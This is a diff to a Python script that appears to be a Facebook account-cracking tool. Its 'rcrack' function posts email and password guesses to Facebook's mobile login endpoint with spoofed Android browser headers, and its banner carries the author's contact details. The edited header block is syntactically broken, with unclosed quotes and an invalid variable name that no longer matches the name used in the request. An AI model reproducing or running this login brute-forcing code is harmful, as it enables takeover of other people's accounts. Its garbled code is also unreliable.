@@ -110,9 +110,9 @@ logo =("""
 ╠══[Author                   • \33[1;38mMR- ]\33[1;38m     ║\033[1;31m 
 ╠══[Facebook                 • RABBI King ]   ║  \033[1;97m  
 ╠══[Github                   • \33[1;38mRABBI-King ]   ║\33[1;34m   
-╠══[Whatsapp                 • 01608843956 ]  ║\33[1;35m 
-╠══[TOOLS                    • peid  ]        ║ \33[1;32m   
-╠══[VERSION                  • 1.1 ]          ║\033[1;35m 
+╠══[Whatsapp                 • 01308447902 ]  ║\33[1;35m 
+╠══[TOOLS                    • free  ]        ║ \33[1;32m   
+╠══[VERSION                  • 1.2 ]          ║\033[1;35m 
 \033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
 loop = 0
 oks = []
@@ -236,19 +236,19 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'mbasic.facebook.com',
+            freefb headers= {"authority": 'm.facebook.com',
             "method": 'GET',
             "scheme": 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            accept-language: en-GB,en-US;q=0.9,en;q=0.8
+            cache-control: max-age=0
+            sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="98"
+            sec-ch-ua-mobile: ?1
+            sec-ch-ua-platform: "Android"
+            sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
+            'sec-fetch-site: cross-site
+            sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
